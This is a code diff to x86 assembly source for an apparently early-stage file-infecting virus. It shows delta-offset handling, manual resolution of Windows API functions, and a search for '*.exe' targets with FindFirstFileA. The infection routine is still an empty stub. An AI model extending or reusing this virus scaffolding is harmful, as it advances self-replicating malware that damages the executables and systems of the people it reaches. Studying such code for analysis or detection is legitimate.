@@ -99,11 +99,10 @@ find_first:
     push    esi ; DOS header
     call    ent_get_function_addr
 
+    ; allocate sizeof(struct WIN32_FIND_DATA) on stack
     push    ebp
     mov     ebp, esp
     sub     esp, 320
-    mov     find_data [ebp - 320], offset win32_find_data
-    push    find_data [ebp - 320]
 
     ; push args && call the function: arg2 WIN32_FIND_DATA, arg1 filter '*.exe'
     lea     ecx, [ebp - 320]
@@ -121,14 +120,16 @@ find_first:
     sub     ebx, offset deltaoffset
     mov     ebx, eax
 
-    ; TODO: successfully gets first .exe, but the registers are messed up :x
+    ; DEBUG print first .exe found
+    xor     ebx, ebx
+    lea     ebx, [ebp - 276]
+    invoke  StdOut, ebx
 
-infect_file:
-    ; nada
+    pop     ebp
+
+    call    infect_file
 
     call    exit_success
-
-
 
 
 
@@ -420,6 +421,10 @@ strcmp_done:
     pop     ebp
     ret     8
 
+infect_file:
+    ; nada
+    ret
+
 exit_success:
     ; WIN
     mov     eax,042h
@@ -451,16 +456,15 @@ virus_data:
    find_data ends
 
    win32_find_data find_data <?>
-   ;win32_find_data WIN32_FIND_DATAA <?>
    FileHandleFind  dd ?
    filter          db "*.exe",0
 
-    ;WndTextOut1 db  "Address: 0x"
-    ;WndTextOut2 db  8 dup (66), 13, 10
-    ;WndTextFmt  db  "%08x",0
-    ;Error       db  "Error",0
-    ;NewLine     db  "  ",0
-    ;exportName  db  "ExitProcess",0
+   ;WndTextOut1 db  "Address: 0x"
+   ;WndTextOut2 db  8 dup (66), 13, 10
+   ;WndTextFmt  db  "%08x",0
+   ;Error       db  "Error",0
+   ;NewLine     db  "  ",0
+   ;exportName  db  "ExitProcess",0
 
    FindFirstFile_b db  "FindFirstFileA",0
    ExitProcess_b   db  "ExitProcess",0
